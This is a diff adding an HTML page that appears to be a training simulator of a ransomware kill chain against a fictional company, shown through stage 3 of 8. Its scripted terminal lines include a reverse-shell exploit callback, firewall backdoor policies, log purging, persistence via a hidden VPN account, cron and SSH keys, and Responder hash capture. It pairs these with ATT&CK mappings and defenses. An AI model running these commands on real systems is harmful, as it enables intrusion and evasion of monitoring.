@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ransomware Kill Chain — Full Attack Simulation</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Oxanium:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{background:#080b14;color:#c9d1d9;font-family:'Segoe UI',system-ui,sans-serif;display:flex;flex-direction:column;overflow:hidden}
+::-webkit-scrollbar{width:7px}::-webkit-scrollbar-track{background:#0d1117}::-webkit-scrollbar-thumb{background:#21262d;border-radius:3px}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
+@keyframes scanAnim{0%{top:-1px}100%{top:100%}}
+
+/* ══ STICKY TOP ══ */
+.stop{flex-shrink:0;background:#080b14;border-bottom:1px solid #1b2230;z-index:50}
+.hdr{background:linear-gradient(180deg,#0d1117,#0a0e18);padding:6px 20px;display:flex;align-items:center;justify-content:space-between}
+.hdr-l{display:flex;align-items:center;gap:12px}
+.hdr-t{font-family:'Oxanium',monospace;font-size:20px;font-weight:700;color:#f87171;letter-spacing:2px;text-transform:uppercase}
+.hdr-m{display:flex;gap:16px;font-size:15px;font-family:'JetBrains Mono',monospace;color:#6e7681;background:#0d1117;padding:6px 14px;border-radius:5px;border:1px solid #1b2230}
+.hdr-m .v{color:#58a6ff}
+.kcn{display:flex;gap:1px;padding:2px 20px 0;background:#0a0d16;overflow-x:auto}
+.ks{flex:1;min-width:72px;padding:6px 4px 5px;border:none;cursor:pointer;background:transparent;border-bottom:3px solid #1b2230;transition:all .2s;text-align:center}
+.ks:hover{background:#0d1117}.ks.a{background:#111620;border-bottom-color:#f87171}
+.ks.dn{border-bottom-color:#3fb950}.ks.enc{border-bottom-color:#da3633}
+.ks em{font-size:22px;font-style:normal;display:block}.ks span{font-size:11px;font-family:'JetBrains Mono',monospace;color:#6e7681;display:block;margin-top:1px;white-space:nowrap}
+.ks.a span{color:#e6edf3;font-weight:600}
+
+/* ══ STICKY BOTTOM ══ */
+.sbot{flex-shrink:0;background:#0a0e18;border-top:1px solid #1b2230;padding:8px 20px;display:flex;align-items:center;gap:8px;z-index:50;flex-wrap:wrap}
+.b{border:none;border-radius:6px;padding:10px 24px;font-family:'Oxanium',monospace;font-weight:600;font-size:17px;cursor:pointer;transition:all .15s;letter-spacing:.5px}
+.br{background:#da3633;color:#fff}.br:hover{background:#f85149}
+.bp{background:#d29922;color:#0d1117}
+.bs{background:#161b22;color:#8b949e;border:1px solid #21262d;font-family:'JetBrains Mono',monospace;font-size:15px;padding:9px 16px;font-weight:400}
+.bs:hover{background:#21262d}
+.bn{background:#161b22;color:#8b949e;border:1px solid #21262d;font-family:'Oxanium',monospace;font-size:16px;padding:9px 20px}
+.bn.nx{background:#da3633;color:#fff;border:none;font-weight:600}
+.bn:disabled{opacity:.25;cursor:default}
+.sg{display:flex;align-items:center;gap:6px;margin-left:auto}
+.sl{font-size:14px;color:#6e7681;font-family:'JetBrains Mono',monospace}
+.sp{background:transparent;color:#6e7681;border:1px solid #1b2230;border-radius:4px;padding:5px 10px;font-size:14px;cursor:pointer;font-family:'JetBrains Mono',monospace}
+.sp.on{background:#21262d;color:#58a6ff;border-color:#58a6ff}
+.pb{width:160px;height:5px;background:#161b22;border-radius:3px;overflow:hidden;margin-left:6px}
+.pf{height:100%;background:#f87171;transition:width .2s}.pf.ok{background:#3fb950}
+
+/* ══ MAIN ══ */
+.mg{display:grid;grid-template-columns:1fr 340px;flex:1;overflow:hidden}
+@media(max-width:1000px){.mg{grid-template-columns:1fr}}
+.lp{display:flex;flex-direction:column;border-right:1px solid #1b2230;overflow:hidden}
+.rp{display:flex;flex-direction:column;background:#0a0d16;overflow-y:auto}
+
+.sb{padding:8px 20px;border-bottom:1px solid #1b2230;background:#0a0d16;flex-shrink:0}
+.sr{display:flex;align-items:center;gap:10px}
+.si{font-size:28px}.sn{font-family:'Oxanium',monospace;font-size:20px;font-weight:700;color:#e6edf3}
+.ss{font-size:13px;color:#a371f7;font-family:'JetBrains Mono',monospace}
+.sd{font-size:13px;color:#8b949e;line-height:1.45;margin-top:6px;display:none}
+.sd.vis{display:block}
+.so{margin-top:6px;padding:8px 12px;background:#161b22;border:1px solid #f8717130;border-radius:5px;font-size:12px;color:#f87171;font-family:'JetBrains Mono',monospace;line-height:1.4;display:none}
+.so.vis{display:block}
+.so b{color:#ff7b72}
+.stog{background:none;border:1px solid #21262d;color:#6e7681;font-size:11px;font-family:'JetBrains Mono',monospace;padding:3px 8px;border-radius:3px;cursor:pointer;margin-left:auto;flex-shrink:0}
+.stog:hover{background:#161b22;color:#8b949e}
+
+.pt{display:flex;gap:0;padding:0 20px;background:#0a0d16;border-bottom:1px solid #1b2230;overflow-x:auto;flex-shrink:0}
+.ptb{padding:7px 14px;border:none;cursor:pointer;background:transparent;color:#6e7681;font-size:14px;font-family:'JetBrains Mono',monospace;border-bottom:2px solid transparent;transition:all .15s;white-space:nowrap}
+.ptb:hover{color:#8b949e}.ptb.a{color:#58a6ff;border-bottom-color:#58a6ff;background:#0d111a}
+
+.trm{flex:1;padding:14px 24px;overflow-y:auto;background:#0a0d16;position:relative;font-size:16px;line-height:1.75}
+.trm .sc{position:absolute;top:0;left:0;right:0;height:1px;background:#58a6ff;opacity:.05;animation:scanAnim 5s linear infinite;pointer-events:none}
+.tl{font-family:'JetBrains Mono',monospace;white-space:pre-wrap;word-break:break-all;animation:fadeUp .08s ease}
+.tc{color:#58a6ff;font-weight:600}.to{color:#8b949e}.ti{color:#a371f7;font-weight:500}
+.tw{color:#d29922;font-weight:500}.ta{color:#f87171;font-weight:600}.ts{color:#3fb950;font-weight:600}
+.tcc{color:#484f58;font-style:italic}.tb{color:#f87171;font-weight:700;background:#f8717108;display:block}
+.tdd{color:#1b2230;user-select:none}.cur{color:#58a6ff;animation:blink .7s infinite}
+
+.st{font-size:12px;color:#6e7681;font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:1.2px;margin-bottom:6px}
+.rs{padding:10px 14px;border-bottom:1px solid #1b2230}
+.ig{display:grid;grid-template-columns:1fr 1fr;gap:5px}
+.ic{background:#0d1117;border-radius:4px;padding:7px 10px;border:1px solid #1b2230}
+.il{font-size:11px;color:#6e7681;font-family:'JetBrains Mono',monospace;margin-bottom:1px}
+.iv{font-size:15px;color:#f87171;font-family:'Oxanium',monospace;font-weight:600}
+.wi{background:#d299220a;border:1px solid #d2992228;border-radius:4px;padding:7px 10px;font-size:13px;color:#d29922;font-family:'JetBrains Mono',monospace;line-height:1.35;margin-bottom:4px}
+.bd{width:100%;border:1px solid #21262d;border-radius:4px;padding:8px;font-family:'Oxanium',monospace;font-weight:600;font-size:13px;cursor:pointer;letter-spacing:1px;text-transform:uppercase;transition:all .2s;margin-bottom:6px}
+.bd.off{background:#161b22;color:#8b949e}.bd.on{background:#0d2818;color:#3fb950;border-color:#238636}
+.dt{background:#0d2818;border:1px solid #23863640;border-radius:4px;padding:7px 10px;font-size:12px;color:#7ee787;font-family:'JetBrains Mono',monospace;line-height:1.35;margin-bottom:4px}
+.tt{background:#0d1117;border:1px solid #1b2230;border-radius:4px;padding:6px 10px;font-size:12px;color:#8b949e;font-family:'JetBrains Mono',monospace;margin-bottom:3px}
+
+.nm{position:relative;height:160px}.nm svg{position:absolute;top:0;left:0;width:100%;height:100%}
+.nd{position:absolute;text-align:center;transition:all .4s;width:88px}
+.nd i{font-size:24px;font-style:normal;display:block}.nd s{font-size:10px;font-family:'JetBrains Mono',monospace;border-radius:3px;padding:2px 4px;white-space:pre-line;line-height:1.2;text-decoration:none;display:block;margin-top:1px}
+.nd.ep i{animation:pulse .8s infinite}
+</style>
+</head>
+<body>
+<!-- ══ TOP ══ -->
+<div class="stop">
+<div class="hdr">
+<div class="hdr-l"><span style="font-size:24px">🔴</span><div><div class="hdr-t">Ransomware Kill Chain Simulator</div></div></div>
+<div class="hdr-m"><span>ATT&CK: <span class="v" id="hm"></span></span><span>Stage: <span class="v" id="hs"></span>/8</span><span>Target: <span class="v">Fictional Org</span></span></div>
+</div>
+<div class="kcn" id="kcn"></div>
+</div>
+<!-- ══ MAIN ══ -->
+<div class="mg">
+<div class="lp" id="lp"><div class="sb" id="stb"></div><div class="pt" id="ptabs"></div><div class="trm" id="trm"><div class="sc"></div></div></div>
+<div class="rp"><div class="rs"><div class="st">Network Topology</div><div class="nm" id="nm"><svg id="ns" viewBox="0 0 310 155"></svg></div></div><div class="rs"><div class="st">Attack Telemetry</div><div class="ig" id="ig"></div></div><div class="rs" id="ws"></div><div class="rs" style="flex:1"><button class="bd off" id="bdf" onclick="tgD()">🛡️ Blue Team Defenses</button><div id="dc"></div></div></div>
+</div>
+<!-- ══ BOTTOM ══ -->
+<div class="sbot">
+<button class="bn" id="bp" onclick="goS(CS-1)">← PREV</button>
+<button class="b br" id="bpl" onclick="doPl()">▶ EXECUTE</button>
+<button class="b bs" onclick="doSk()">SKIP ⏭</button>
+<button class="b bs" onclick="doRs()">RESET</button>
+<button class="bn nx" id="bnx" onclick="goS(CS+1)">NEXT STAGE →</button>
+<div class="sg">
+<span class="sl">SPEED</span>
+<button class="sp" onclick="sS(.5)">.5x</button><button class="sp on" onclick="sS(1)">1x</button><button class="sp" onclick="sS(2)">2x</button><button class="sp" onclick="sS(5)">5x</button>
+</div>
+<div class="pb"><div class="pf" id="pf"></div></div>
+</div>
+<script>
+// ═════════════════════════════════════════════════════════════════
+// ALL NAMES, IPs, DOMAINS ARE ENTIRELY FICTIONAL
+// IPs use RFC 5737 documentation ranges (203.0.113.0/24, 198.51.100.0/24)
+// Domain uses IANA reserved .example TLD — cannot exist in reality
+// Company "Dawnridge Infra" and all person names are fabricated
+// ═════════════════════════════════════════════════════════════════
+const S=[
+// ═══════════════════════════════════════════════════════════════
+// CORRECTED ATTACK FLOW — Based on real ransomware incident reports
+// (Conti playbook, BlackSuit/Royal, LockBit operational procedures)
+//
+// ALL NAMES, IPs, DOMAINS ENTIRELY FICTIONAL
+// IPs: RFC 5737 (203.0.113.0/24, 198.51.100.0/24)
+// Domain: IANA reserved .example TLD
+// ═══════════════════════════════════════════════════════════════
+
+// ━━━ STAGE 1: RECONNAISSANCE ━━━
+{id:"recon",nm:"Reconnaissance",ic:"🔍",m:"TA0043",sub:"Target Profiling & Vulnerability Assessment",
+ds:"Threat actor maps the target's external attack surface using OSINT and active scanning. They identify a FortiGate firewall with SSLVPN exposed and confirm it runs unpatched FortiOS 7.2.3 — vulnerable to CVE-2024-21762 (pre-auth heap OOB write → root RCE, CVSS 9.8).",
+ob:"<b>GOAL:</b> Identify exploitable entry point. Confirm FortiGate SSLVPN is vulnerable to CVE-2024-21762 before investing in weaponization.",
+tl:"attacker@c2-host:~$",
+P:[
+{nm:"OSINT & Passive Recon",C:[
+{t:"cc",x:"# ═══ PASSIVE INTELLIGENCE — ZERO CONTACT WITH TARGET ═══"},
+{t:"c",x:"$ whois 203.0.113.0/24",d:250},
+{t:"o",x:"OrgName:  Dawnridge Infra Pvt Ltd [FICTIONAL]",d:80},
+{t:"o",x:"Address:  Plot 7, Sec-42, Tech Park, [Fictional City]",d:80},
+{t:"o",x:"NetRange: 203.0.113.0 - 203.0.113.255  (RFC5737 TEST-NET-3)",d:80},
+{t:"c",x:"$ dig dawnridge-infra.example ANY +noall +answer",d:300},
+{t:"o",x:"dawnridge-infra.example.  3600 IN A     203.0.113.1",d:60},
+{t:"o",x:"dawnridge-infra.example.  3600 IN MX    10 mail.dawnridge-infra.example.",d:60},
+{t:"c",x:"$ subfinder -d dawnridge-infra.example -silent",d:350},
+{t:"o",x:"vpn.dawnridge-infra.example",d:50},{t:"o",x:"mail.dawnridge-infra.example",d:50},
+{t:"o",x:"erp.dawnridge-infra.example",d:50},{t:"o",x:"portal.dawnridge-infra.example",d:50},
+{t:"i",x:"[*] 4 subdomains — vpn endpoint is primary target",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Search breach databases for leaked credentials (fallback for VPN access)"},
+{t:"c",x:"$ python3 dehashed_query.py --domain dawnridge-infra.example",d:350},
+{t:"o",x:"[*] Querying breach databases...",d:400},
+{t:"w",x:"  user_alpha@dawnridge-infra.example : Winter@2023   (breach: 2023-DB)",d:80},
+{t:"w",x:"  user_beta@dawnridge-infra.example  : Welcome#2024! (breach: 2024-Forum)",d:80},
+{t:"i",x:"[+] 18 leaked credentials harvested — VPN bruteforce fallback",d:200},
+]},
+{nm:"Active Scanning & Fingerprint",C:[
+{t:"cc",x:"# ═══ ACTIVE SERVICE ENUMERATION ═══"},
+{t:"c",x:"$ nmap -sV -sC -O -p 1-65535 --min-rate 2000 203.0.113.1 -oA target_fw",d:400},
+{t:"o",x:"Nmap scan report for fw-gw.dawnridge-infra.example (203.0.113.1)",d:200},
+{t:"o",x:"PORT      STATE SERVICE        VERSION",d:80},
+{t:"o",x:"22/tcp    open  ssh            OpenSSH 8.9p1",d:70},
+{t:"o",x:"443/tcp   open  ssl/https      Fortinet FortiOS httpd",d:70},
+{t:"o",x:"8443/tcp  open  ssl/https-alt  FortiGate Admin Console",d:70},
+{t:"a",x:"10443/tcp open  ssl/https      FortiGate SSLVPN Portal",d:70},
+{t:"i",x:"[!] FortiGate with SSLVPN + Admin Console exposed to internet",d:200},
+{t:"d",x:""},
+{t:"c",x:"$ curl -sk https://203.0.113.1:10443/remote/info | jq .",d:350},
+{t:"o",x:'{ "version": "FortiOS-7.2.3", "build": "1262",',d:70},
+{t:"o",x:'  "model": "FortiGate-200F", "serial": "FGT2XXFTK23XXXXXX",',d:70},
+{t:"o",x:'  "sslvpn_web_mode": true, "sslvpn_tunnel_mode": true }',d:70},
+{t:"a",x:"[!!] FortiGate-200F / FortiOS 7.2.3 build1262 — SSLVPN exposed",d:200},
+]},
+{nm:"CVE Validation",C:[
+{t:"cc",x:"# ═══ VULNERABILITY CONFIRMATION ═══"},
+{t:"c",x:"$ python3 cve_2024_21762_check.py --target 203.0.113.1 --port 10443 --safe-check",d:400},
+{t:"o",x:"[*] Sending OOB probe to /remote/hostcheck_validate...",d:500},
+{t:"o",x:"[*] Heap response: metadata corruption signature present",d:300},
+{t:"o",x:"[*] Stack canary: 0x00000000 (none on this build)",d:200},
+{t:"s",x:"[+] CONFIRMED: CVE-2024-21762 (Pre-Auth RCE, CVSS 9.8)",d:200},
+{t:"s",x:"[+] CISA KEV — actively exploited in the wild",d:150},
+{t:"d",x:""},
+{t:"i",x:"[RECON COMPLETE]",d:100},
+{t:"i",x:"  Target:  FortiGate-200F, FortiOS 7.2.3, SSLVPN:10443",d:80},
+{t:"i",x:"  Vuln:    CVE-2024-21762 — heap OOB write → pre-auth RCE as root",d:80},
+{t:"i",x:"  Backup:  18 leaked credentials for VPN bruteforce fallback",d:80},
+{t:"i",x:"  → Proceeding to weaponize exploit and gain root shell",d:80},
+]}],
+N:{attacker:"active",firewall:"target",lan:"hidden",ad:"hidden",fs:"hidden"},
+I:[{l:"Hosts Scanned",v:"256"},{l:"Open Ports",v:"4"},{l:"CVE",v:"2024-21762"},{l:"CVSS",v:"9.8 CRITICAL"},{l:"Leaked Creds",v:"18"},{l:"Vector",v:"SSLVPN RCE"}],
+W:["Weaponize heap overflow exploit","Prepare encrypted reverse shell callback","Gain root access on perimeter firewall"],
+T:["T1595.001 — Active Scanning: IP Blocks","T1592.002 — Gather Host Info: Software","T1589.001 — Gather Identity: Credentials","T1590.002 — Gather Network Info: DNS"],
+D:["Move management interfaces behind VPN/jumphost","Disable SSLVPN web-mode if unused","Patch within 48h for CVSS 9+ advisories","Monitor Shodan/Censys for corporate asset exposure","Force password resets for breached accounts"]
+},
+
+// ━━━ STAGE 2: INITIAL ACCESS & C2 ESTABLISHMENT ━━━
+// Real flow: Exploit → root shell → immediately subvert the firewall to
+// open LAN access, blind logging, establish persistent C2 channel.
+// All of this happens in the first ~30 minutes.
+{id:"access",nm:"Initial Access & C2",ic:"💥",m:"TA0001",sub:"Exploit, Perimeter Takeover & C2 Establishment",
+ds:"Attacker exploits CVE-2024-21762 (heap OOB write in sslvpnd) to gain root shell on the FortiGate. They immediately subvert the firewall — creating hidden WAN→LAN policies, disabling IPS/IDS and syslog to blind the SIEM, planting a backdoor VPN account, and establishing a SOCKS proxy for LAN pivoting. This all happens within the first 30 minutes.",
+ob:"<b>GOAL:</b> (1) Root shell on FortiGate, (2) Covert WAN→LAN path with no logging, (3) IPS disabled + SIEM blinded, (4) Persistent backdoor VPN account, (5) SOCKS pivot into internal LAN.",
+tl:"attacker@c2-host:~$",
+P:[
+{nm:"Exploit & Root Shell",C:[
+{t:"cc",x:"# ═══ CVE-2024-21762: HEAP OOB WRITE IN sslvpnd ═══"},
+{t:"cc",x:"# Chunked Transfer-Encoding mismatch → tcache corruption → __free_hook hijack"},
+{t:"c",x:"$ nc -nlvp 4443 &",d:150},
+{t:"o",x:"Listening on 0.0.0.0:4443",d:100},
+{t:"c",x:"$ python3 exploit_2024_21762.py --target 203.0.113.1 --port 10443 --lhost 198.51.100.44 --lport 4443",d:350},
+{t:"o",x:"[*] Target: 203.0.113.1:10443 | Callback: 198.51.100.44:4443",d:150},
+{t:"i",x:"[1/5] Heap spray: 256 chunks × 0x200 bytes → groom tcache",d:300},
+{t:"i",x:"[2/5] Trigger OOB via malformed POST /remote/hostcheck_validate",d:400},
+{t:"i",x:"[3/5] Corrupt tcache → overwrite __free_hook → 0x7f3a2c040000",d:400},
+{t:"i",x:"[4/5] Trigger free() → redirect to shellcode",d:300},
+{t:"i",x:"[5/5] Reverse shell executing...",d:300},
+{t:"a",x:"[+] ████ CODE EXECUTION ACHIEVED ████",d:200},
+{t:"s",x:"Connection from 203.0.113.1:52341 → 198.51.100.44:4443",d:250},
+{t:"d",x:""},
+{t:"c",x:"# id",d:150},{t:"a",x:"uid=0(root) gid=0(root)",d:100},
+{t:"c",x:"# cat /etc/version",d:100},{t:"o",x:"FortiGate-200F v7.2.3,build1262,240123 (GA.F)",d:100},
+{t:"c",x:"# python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",d:150},
+{t:"s",x:"[+] Interactive TTY established as root",d:150},
+{t:"d",x:""},
+{t:"cc",x:"# Map network interfaces — identify LAN subnets"},
+{t:"c",x:"# fnsysctl ifconfig | grep -E '^[a-z]|inet'",d:250},
+{t:"o",x:"wan1:     inet 203.0.113.1/24    (INTERNET)",d:60},
+{t:"a",x:"internal: inet 10.10.0.1/16      (CORP LAN)",d:60},
+{t:"o",x:"dmz:      inet 172.16.0.1/24     (DMZ)",d:60},
+{t:"o",x:"mgmt:     inet 192.168.1.1/24    (MANAGEMENT)",d:60},
+{t:"i",x:"[+] Target LAN: 10.10.0.0/16 — proceeding to subvert firewall",d:200},
+]},
+{nm:"Firewall Subversion & Logging Kill",C:[
+{t:"cc",x:"# ═══ SUBVERT FIREWALL — OPEN COVERT PATH + BLIND ALL MONITORING ═══"},
+{t:"cc",x:"# This must happen FIRST: open LAN access and kill logging before doing anything else"},
+{t:"c",x:"# config firewall policy",d:150},
+{t:"c",x:'(policy)# edit 9999\n  set srcintf "wan1"\n  set dstintf "internal"\n  set srcaddr "all"\n  set dstaddr "all"\n  set action accept\n  set schedule "always"\n  set service "ALL"\n  set logtraffic disable\n  set logtraffic-start disable\n  set nat enable\nnext',d:400},
+{t:"a",x:"[+] Policy 9999: WAN→LAN ANY/ANY — logging DISABLED",d:200},
+{t:"c",x:'(policy)# edit 9998\n  set srcintf "internal"\n  set dstintf "internal"\n  set srcaddr "all"\n  set dstaddr "all"\n  set action accept\n  set logtraffic disable\nnext\nend',d:300},
+{t:"a",x:"[+] Policy 9998: Internal ANY→ANY — microsegmentation BYPASSED",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Disable IPS, Application Control, and all logging"},
+{t:"c",x:'# config ips sensor\n  edit "default"\n    config entries\n      edit 1\n        set status disable\n        set log disable\n      next\n    end\n  next\nend',d:300},
+{t:"a",x:"[+] IPS sensor DISABLED",d:150},
+{t:"c",x:'# config log syslogd setting\n  set status disable\nend',d:200},
+{t:"a",x:"[+] Syslog forwarding DISABLED — SIEM is blind",d:200},
+{t:"c",x:'# config log disk setting\n  set maximum-log-age 1\n  set diskfull overwrite\nend',d:200},
+{t:"c",x:"# execute log delete-all",d:200},
+{t:"a",x:"[+] All historical firewall logs PURGED",d:200},
+]},
+{nm:"Persistence & C2 Pivot",C:[
+{t:"cc",x:"# ═══ ESTABLISH PERSISTENCE + C2 PIVOT INTO LAN ═══"},
+{t:"cc",x:"# Backdoor VPN account — name mimics legitimate FortiGuard service"},
+{t:"c",x:'# config user local\n  edit "svc_fguard_sync"\n    set type password\n    set passwd "[REDACTED-32char]"\n    set status enable\n  next\nend',d:300},
+{t:"c",x:'# config vpn ssl settings\n  config authentication-rule\n    edit 99\n      set users "svc_fguard_sync"\n      set portal "full-access"\n    next\n  end\nend',d:300},
+{t:"s",x:"[+] Backdoor VPN user: svc_fguard_sync → full-access",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Cron persistence: auto-restores covert policy if admin disables it"},
+{t:"c",x:'# echo "*/5 * * * * fnsysctl cmdb_set firewall.policy.9999.status enable" >> /etc/crontab',d:250},
+{t:"s",x:"[+] Cron persistence: policy auto-restores every 5 min",d:150},
+{t:"cc",x:"# SSH key persistence for direct re-entry"},
+{t:"c",x:'# echo "ssh-ed25519 AAAA...c2_key" >> /root/.ssh/authorized_keys',d:200},
+{t:"s",x:"[+] SSH persistence installed",d:150},
+{t:"d",x:""},
+{t:"cc",x:"# Establish SOCKS proxy for tunneling into LAN"},
+{t:"c",x:"# nohup socat TCP-LISTEN:1080,fork,reuseaddr SOCKS4A:- &",d:200},
+{t:"s",x:"[+] SOCKS proxy active on fw-gw:1080 — LAN pivot ready",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Dump VPN user hashes + full config for offline intel"},
+{t:"c",x:"# fnsysctl cat /dev/cmdb/cmdb_user | grep -c 'edit'",d:200},
+{t:"o",x:"14 VPN user accounts",d:100},
+{t:"c",x:"# fnsysctl cat /dev/cmdb/cmdb_config > /tmp/.c && wc -l /tmp/.c",d:200},
+{t:"o",x:"4,823 lines — full firewall config captured",d:100},
+{t:"d",x:""},
+{t:"i",x:"[ACCESS ESTABLISHED — T+28 minutes]",d:100},
+{t:"i",x:"  Root shell on FortiGate-200F",d:80},
+{t:"i",x:"  Covert WAN→LAN policy (no logging) + segmentation bypassed",d:80},
+{t:"i",x:"  IPS disabled | Syslog disabled | Logs purged",d:80},
+{t:"i",x:"  Backdoor VPN: svc_fguard_sync | SSH persistence | Cron watchdog",d:80},
+{t:"i",x:"  SOCKS pivot ready | 14 VPN hashes + full config captured",d:80},
+{t:"i",x:"  → Proceeding to internal LAN discovery",d:80},
+]}],
+N:{attacker:"active",firewall:"compromised",lan:"visible",ad:"hidden",fs:"hidden"},
+I:[{l:"CVE",v:"2024-21762"},{l:"Access",v:"root"},{l:"IPS/Syslog",v:"DISABLED"},{l:"Backdoors",v:"VPN+SSH+Cron"},{l:"VPN Hashes",v:"14"},{l:"Pivot",v:"SOCKS:1080"}],
+W:["Tunnel through SOCKS proxy into internal LAN","Enumerate domain controllers and file servers","Poison name resolution to capture domain credentials"],
+T:["T1190 — Exploit Public-Facing Application","T1059.004 — Unix Shell","T1562.001 — Disable Security Tools (IPS)","T1562.002 — Disable Logging (Syslog)","T1136.001 — Create Local Account","T1090 — SOCKS Proxy","T1053.003 — Cron"],
+D:["Emergency patch FortiOS to 7.2.7+","Block SSLVPN from non-corporate GeoIPs","Dual-admin approval for policy changes","Immutable log forwarding (can't disable from FW)","Hash FW config hourly — alert on drift","Deploy IDS signatures for CVE-2024-21762"]
+},
+
+// ━━━ STAGE 3: DISCOVERY & CREDENTIAL ACCESS ━━━
+// Real flow: First action in LAN is passive recon + credential harvesting.
+// Responder poisoning captures NTLMv2 hashes from normal network traffic.
+// Attacker stays quiet — no loud exploitation yet.
+{id:"discovery",nm:"Discovery & Credential Access",ic:"🔎",m:"TA0007",sub:"Internal Reconnaissance & NTLM Hash Capture",
+ds:"Using the SOCKS proxy through the compromised firewall, the attacker tunnels into the internal LAN. First they passively map the network — discovering domain controllers, file servers, backup servers, and 338 workstations. Then they deploy Responder to poison LLMNR/NBT-NS name resolution, capturing NTLMv2 hashes from workstations that attempt to resolve non-existent hostnames. The hashes are cracked offline.",
+ob:"<b>GOAL:</b> (1) Map all internal assets without triggering alerts, (2) Identify domain controllers, file servers, backup infrastructure, (3) Capture domain user credentials via LLMNR/NBT-NS poisoning, (4) Crack NTLMv2 hashes offline.",
+tl:"attacker@c2-host:~$ [proxychains→fw-gw]",
+P:[
+{nm:"Internal Network Mapping",C:[
+{t:"cc",x:"# ═══ INTERNAL RECONNAISSANCE VIA SOCKS PIVOT ═══"},
+{t:"cc",x:"# All traffic tunnels through compromised FortiGate SOCKS proxy"},
+{t:"c",x:"$ proxychains4 -q nmap -sT -Pn -n --top-ports 20 10.10.0.0/16 --open -oG int_scan.gnmap",d:400},
+{t:"o",x:"[proxychains] Dynamic chain → 203.0.113.1:1080",d:200},
+{t:"o",x:"Scanning 65536 hosts...",d:800},
+{t:"a",x:"10.10.1.10 (DC01.corp.dawnridge.example)   88,135,389,445,636,3268,3389,5985",d:100},
+{t:"a",x:"10.10.1.11 (DC02.corp.dawnridge.example)   88,135,389,445,636,3268",d:100},
+{t:"w",x:"10.10.2.50 (FS01.corp.dawnridge.example)   135,445,3389",d:100},
+{t:"w",x:"10.10.2.51 (BACKUP01)                       135,445,3389,9392",d:100},
+{t:"o",x:"10.10.3.100 (SQL01.corp.dawnridge.example)  135,445,1433,3389",d:100},
+{t:"o",x:"10.10.4.x   (Workstations)                  338 hosts: 445,3389",d:150},
+{t:"i",x:"[+] 345 hosts: 2 DCs, 1 file server, 1 backup, 1 SQL, 338 workstations",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Check for SMB signing — required for NTLM relay attacks"},
+{t:"c",x:"$ proxychains4 -q crackmapexec smb 10.10.1.10 10.10.2.50 10.10.2.51 --gen-relay-list relay.txt",d:350},
+{t:"o",x:"SMB 10.10.1.10 445 DC01   [*] signing:True  (required)",d:100},
+{t:"o",x:"SMB 10.10.2.50 445 FS01   [*] signing:False (not required)",d:100},
+{t:"o",x:"SMB 10.10.2.51 445 BACKUP [*] signing:False (not required)",d:100},
+{t:"w",x:"[!] FS01 + BACKUP01: SMB signing DISABLED — relayable targets",d:250},
+{t:"d",x:""},
+{t:"cc",x:"# Enumerate domain trusts, password policy, account lockout"},
+{t:"c",x:"$ proxychains4 -q crackmapexec smb 10.10.1.10 -u '' -p '' --pass-pol",d:300},
+{t:"o",x:"Minimum password length: 8 | Lockout threshold: 5 | Lockout duration: 30m",d:100},
+{t:"o",x:"Password complexity: enabled | Max password age: 90 days",d:100},
+{t:"i",x:"[+] Lockout threshold 5 — Responder is safer than bruteforce",d:200},
+]},
+{nm:"Credential Capture (Responder)",C:[
+{t:"cc",x:"# ═══ NTLM HASH CAPTURE VIA LLMNR/NBT-NS POISONING ═══"},
+{t:"cc",x:"# Responder answers LLMNR/NBT-NS broadcast queries with our IP."},
+{t:"cc",x:"# When workstations try to resolve non-existent names (typos, stale"},
+{t:"cc",x:"# shortcuts, GPO artifacts), they send NTLMv2 auth to our rogue server."},
+{t:"cc",x:"# This is PASSIVE — we just listen to normal network traffic."},
+{t:"c",x:"$ proxychains4 -q python3 Responder.py -I tun0 -wrfv",d:300},
+{t:"o",x:"[*] LLMNR/NBT-NS/mDNS Poisoner started",d:200},
+{t:"o",x:"[*] Listening for broadcast queries...",d:400},
+{t:"w",x:"[*] [LLMNR] Poisoned: 10.10.4.23 queried 'printsvr01'",d:250},
+{t:"a",x:"[+] NTLMv2-SSP: CORP\\user_alpha :: 10.10.4.23",d:200},
+{t:"o",x:"    user_alpha::CORP:a1b2c3d4e5f6:F3E2D1C0B9A8...",d:80},
+{t:"w",x:"[*] [NBT-NS] Poisoned: 10.10.4.87 queried 'WPAD'",d:250},
+{t:"a",x:"[+] NTLMv2-SSP: CORP\\user_beta :: 10.10.4.87",d:200},
+{t:"o",x:"    user_beta::CORP:7f8e9d0c1b2a:D4C3B2A19087...",d:80},
+{t:"i",x:"[+] 2 NTLMv2 hashes captured — moving to offline cracking",d:200},
+]},
+{nm:"Offline Hash Cracking",C:[
+{t:"cc",x:"# ═══ CRACK NTLMv2 HASHES OFFLINE ═══"},
+{t:"cc",x:"# NTLMv2 uses HMAC-MD5 — fast to crack with GPU + rules"},
+{t:"c",x:"$ hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule -O -w 3",d:350},
+{t:"o",x:"Session: hashcat | Backend: CUDA (RTX 4090)",d:100},
+{t:"o",x:"Speed: 1,245.3 MH/s | Progress: 89.2%",d:400},
+{t:"a",x:"CORP\\user_alpha : W!nterSecure2024",d:150},
+{t:"a",x:"CORP\\user_beta  : Passw0rd@2024!",d:150},
+{t:"s",x:"[+] Both passwords cracked — 100% recovery",d:200},
+{t:"d",x:""},
+{t:"cc",x:"# Validate credentials and check group memberships"},
+{t:"c",x:"$ proxychains4 -q crackmapexec smb 10.10.1.10 -u user_alpha -p 'W!nterSecure2024' --groups",d:350},
+{t:"o",x:"SMB 10.10.1.10 445 DC01 [+] CORP\\user_alpha",d:100},
+{t:"a",x:"  Groups: Domain Users, IT-Admins, Server-Operators",d:100},
